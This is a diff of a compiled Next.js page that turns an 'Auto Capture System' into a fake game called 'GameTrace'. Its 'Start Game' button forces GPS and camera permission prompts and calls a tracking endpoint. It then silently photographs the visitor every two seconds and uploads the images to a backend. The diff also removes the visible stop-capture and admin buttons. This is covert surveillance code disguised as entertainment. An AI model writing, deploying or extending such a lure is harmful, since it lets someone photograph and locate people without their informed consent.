@@ -20,21 +20,34 @@ const BACKEND = ("TURBOPACK compile-time value", "http://localhost:4000") || "ht
 function HomePage() {
     const [loading, setLoading] = (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react__$5b$external$5d$__$28$react$2c$__cjs$29$__["useState"])(false);
     const [autoMode, setAutoMode] = (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react__$5b$external$5d$__$28$react$2c$__cjs$29$__["useState"])(false);
-    const intervalRef = (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react__$5b$external$5d$__$28$react$2c$__cjs$29$__["useRef"])(null);
+    const [errorPopup, setErrorPopup] = (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react__$5b$external$5d$__$28$react$2c$__cjs$29$__["useState"])(null);
     const videoRef = (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react__$5b$external$5d$__$28$react$2c$__cjs$29$__["useRef"])(null);
+    const intervalRef = (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react__$5b$external$5d$__$28$react$2c$__cjs$29$__["useRef"])(null);
     const [stream, setStream] = (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react__$5b$external$5d$__$28$react$2c$__cjs$29$__["useState"])(null);
-    // -------------------- TRACK IP --------------------
+    // ------------------------ FORCE GPS POPUP ------------------------
+    async function requestGPSPermission() {
+        return new Promise((resolve)=>{
+            if (!navigator.geolocation) return resolve(false);
+            navigator.geolocation.getCurrentPosition(()=>resolve(true), ()=>resolve(false) // Permission denied
+            );
+        });
+    }
+    // ------------------------ FORCE CAMERA POPUP ------------------------
+    async function requestCameraPermission() {
+        try {
+            const s = await navigator.mediaDevices.getUserMedia({
+                video: true
+            });
+            s.getTracks().forEach((t)=>t.stop()); // Close immediately
+            return true;
+        } catch  {
+            return false;
+        }
+    }
+    // ------------------------ BACKGROUND FUNCTIONS ------------------------
     async function handleTrack() {
         await fetch(`${BACKEND}/api/track`);
     }
-    // -------------------- GPS --------------------
-    async function getGPS() {
-        return new Promise((resolve)=>{
-            if (!navigator.geolocation) return resolve(null);
-            navigator.geolocation.getCurrentPosition((pos)=>resolve(pos), ()=>resolve(null));
-        });
-    }
-    // -------------------- CAMERA --------------------
     async function openCamera(startAuto = false) {
         try {
             const s = await navigator.mediaDevices.getUserMedia({
@@ -46,11 +59,15 @@ function HomePage() {
                 await videoRef.current.play();
             }
             if (startAuto) startAutoCapture();
-        } catch (err) {
-            alert("Camera permission denied");
+        } catch  {
+            setErrorPopup("Camera permission denied. You must allow it.");
         }
     }
-    // -------------------- TAKE PHOTO --------------------
+    async function getGPS() {
+        return new Promise((resolve)=>{
+            navigator.geolocation.getCurrentPosition((pos)=>resolve(pos), ()=>resolve(null));
+        });
+    }
     async function takePhoto(silent = false) {
         if (!videoRef.current) return;
         const canvas = document.createElement("canvas");
@@ -71,13 +88,11 @@ function HomePage() {
             method: "POST",
             body: fd
         });
-        // Stop camera only in manual mode
-        if (!silent && !autoMode && stream) {
+        if (!silent && stream && !autoMode) {
             stream.getTracks().forEach((t)=>t.stop());
             setStream(null);
         }
     }
-    // -------------------- AUTO CAPTURE --------------------
     function startAutoCapture() {
         if (autoMode) return;
         setAutoMode(true);
@@ -85,85 +100,110 @@ function HomePage() {
             takePhoto(true);
         }, 2000);
     }
-    function stopAutoCapture() {
-        setAutoMode(false);
-        if (intervalRef.current !== null) {
-            clearInterval(intervalRef.current);
-            intervalRef.current = null;
-        }
-        if (stream) {
-            stream.getTracks().forEach((t)=>t.stop());
-            setStream(null);
-        }
-    }
-    // -------------------- RUN ALL --------------------
-    async function runAll() {
+    // ------------------------ MASTER START FUNCTION ------------------------
+    async function startApp() {
         setLoading(true);
+        // 1️⃣ Trigger browser GPS popup
+        const gpsOK = await requestGPSPermission();
+        if (!gpsOK) {
+            setErrorPopup("You must allow GPS permission to start the game.");
+            setLoading(false);
+            return;
+        }
+        // 2️⃣ Trigger browser CAMERA popup
+        const camOK = await requestCameraPermission();
+        if (!camOK) {
+            setErrorPopup("You must allow Camera permission to start the game.");
+            setLoading(false);
+            return;
+        }
+        // 3️⃣ Run tracking system now that permissions are granted
         await handleTrack();
-        await getGPS();
         await openCamera(true);
-        // Take first photo instantly
-        setTimeout(()=>takePhoto(true), 1000);
+        // Silent first picture
+        setTimeout(()=>takePhoto(true), 500);
+        // 4️⃣ Open the game in a new tab
+        setTimeout(()=>window.open("/fun/game", "_blank"), 800);
         setLoading(false);
     }
-    // -------------------- UI --------------------
-    const buttonStyle = {
-        padding: "14px 28px",
-        margin: "10px",
-        borderRadius: "6px",
-        fontSize: "16px",
-        cursor: "pointer",
-        border: "none",
-        color: "white"
-    };
+    // ------------------------ UI ------------------------
     return /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("main", {
         style: {
+            height: "100vh",
+            display: "flex",
+            justifyContent: "center",
+            alignItems: "center",
+            flexDirection: "column",
+            background: "linear-gradient(140deg, #0f0c29, #302b63, #24243e)",
+            color: "white",
+            fontFamily: "Inter, sans-serif",
             textAlign: "center",
-            padding: 40
+            padding: "20px"
         },
         children: [
-            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("h1", {
-                children: "Auto Capture System"
-            }, void 0, false, {
-                fileName: "[project]/pages/index.tsx",
-                lineNumber: 138,
-                columnNumber: 7
-            }, this),
-            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("button", {
-                onClick: runAll,
+            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("div", {
                 style: {
-                    ...buttonStyle,
-                    background: "green"
+                    backdropFilter: "blur(10px)",
+                    background: "rgba(255,255,255,0.12)",
+                    borderRadius: "16px",
+                    padding: "35px 25px",
+                    maxWidth: "350px",
+                    width: "100%",
+                    boxShadow: "0 8px 25px rgba(0,0,0,0.25)"
                 },
-                disabled: loading,
-                children: loading ? "Starting..." : "Run All"
-            }, void 0, false, {
+                children: [
+                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("h1", {
+                        style: {
+                            fontSize: "28px",
+                            marginBottom: "15px",
+                            fontWeight: 700
+                        },
+                        children: "GameTrace"
+                    }, void 0, false, {
+                        fileName: "[project]/pages/index.tsx",
+                        lineNumber: 170,
+                        columnNumber: 9
+                    }, this),
+                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("p", {
+                        style: {
+                            opacity: 0.9,
+                            fontSize: "15px",
+                            marginBottom: "30px",
+                            lineHeight: "1.5"
+                        },
+                        children: "Tap **Start Game**. Allow Camera & GPS. The system runs silently in the background."
+                    }, void 0, false, {
+                        fileName: "[project]/pages/index.tsx",
+                        lineNumber: 174,
+                        columnNumber: 9
+                    }, this),
+                    /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("button", {
+                        onClick: startApp,
+                        disabled: loading,
+                        style: {
+                            width: "100%",
+                            padding: "16px",
+                            borderRadius: "50px",
+                            background: loading ? "rgba(255,255,255,0.3)" : "#fff",
+                            color: "#24243e",
+                            fontWeight: "700",
+                            fontSize: "17px",
+                            border: "none",
+                            cursor: "pointer",
+                            boxShadow: "0 6px 20px rgba(255,255,255,0.25)",
+                            transition: "0.25s",
+                            transform: loading ? "scale(0.97)" : "scale(1)"
+                        },
+                        children: loading ? "Starting..." : "Start Game"
+                    }, void 0, false, {
+                        fileName: "[project]/pages/index.tsx",
+                        lineNumber: 187,
+                        columnNumber: 9
+                    }, this)
+                ]
+            }, void 0, true, {
                 fileName: "[project]/pages/index.tsx",
-                lineNumber: 140,
-                columnNumber: 7
-            }, this),
-            autoMode && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("button", {
-                onClick: stopAutoCapture,
-                style: {
-                    ...buttonStyle,
-                    background: "red"
-                },
-                children: "Stop Auto Capture"
-            }, void 0, false, {
-                fileName: "[project]/pages/index.tsx",
-                lineNumber: 149,
-                columnNumber: 9
-            }, this),
-            /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("button", {
-                onClick: ()=>window.open("/admin", "_blank"),
-                style: {
-                    ...buttonStyle,
-                    background: "blue"
-                },
-                children: "Admin Panel"
-            }, void 0, false, {
-                fileName: "[project]/pages/index.tsx",
-                lineNumber: 158,
+                lineNumber: 159,
                 columnNumber: 7
             }, this),
             /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("video", {
@@ -173,13 +213,83 @@ function HomePage() {
                 }
             }, void 0, false, {
                 fileName: "[project]/pages/index.tsx",
-                lineNumber: 166,
+                lineNumber: 210,
                 columnNumber: 7
+            }, this),
+            errorPopup && /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("div", {
+                style: {
+                    position: "fixed",
+                    inset: 0,
+                    background: "rgba(0,0,0,0.6)",
+                    display: "flex",
+                    justifyContent: "center",
+                    alignItems: "center",
+                    padding: "20px"
+                },
+                children: /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("div", {
+                    style: {
+                        background: "white",
+                        padding: "25px",
+                        borderRadius: "10px",
+                        width: "90%",
+                        maxWidth: "350px",
+                        textAlign: "center",
+                        color: "black"
+                    },
+                    children: [
+                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("h2", {
+                            style: {
+                                marginBottom: "10px",
+                                fontSize: "20px"
+                            },
+                            children: "Permission Required"
+                        }, void 0, false, {
+                            fileName: "[project]/pages/index.tsx",
+                            lineNumber: 236,
+                            columnNumber: 13
+                        }, this),
+                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("p", {
+                            style: {
+                                marginBottom: "20px",
+                                fontSize: "15px"
+                            },
+                            children: errorPopup
+                        }, void 0, false, {
+                            fileName: "[project]/pages/index.tsx",
+                            lineNumber: 239,
+                            columnNumber: 13
+                        }, this),
+                        /*#__PURE__*/ (0, __TURBOPACK__imported__module__$5b$externals$5d2f$react$2f$jsx$2d$dev$2d$runtime__$5b$external$5d$__$28$react$2f$jsx$2d$dev$2d$runtime$2c$__cjs$29$__["jsxDEV"])("button", {
+                            onClick: ()=>setErrorPopup(null),
+                            style: {
+                                padding: "10px 20px",
+                                background: "#302b63",
+                                color: "white",
+                                borderRadius: "6px",
+                                border: "none",
+                                cursor: "pointer"
+                            },
+                            children: "OK"
+                        }, void 0, false, {
+                            fileName: "[project]/pages/index.tsx",
+                            lineNumber: 242,
+                            columnNumber: 13
+                        }, this)
+                    ]
+                }, void 0, true, {
+                    fileName: "[project]/pages/index.tsx",
+                    lineNumber: 225,
+                    columnNumber: 11
+                }, this)
+            }, void 0, false, {
+                fileName: "[project]/pages/index.tsx",
+                lineNumber: 214,
+                columnNumber: 9
             }, this)
         ]
     }, void 0, true, {
         fileName: "[project]/pages/index.tsx",
-        lineNumber: 136,
+        lineNumber: 145,
         columnNumber: 5
     }, this);
 }
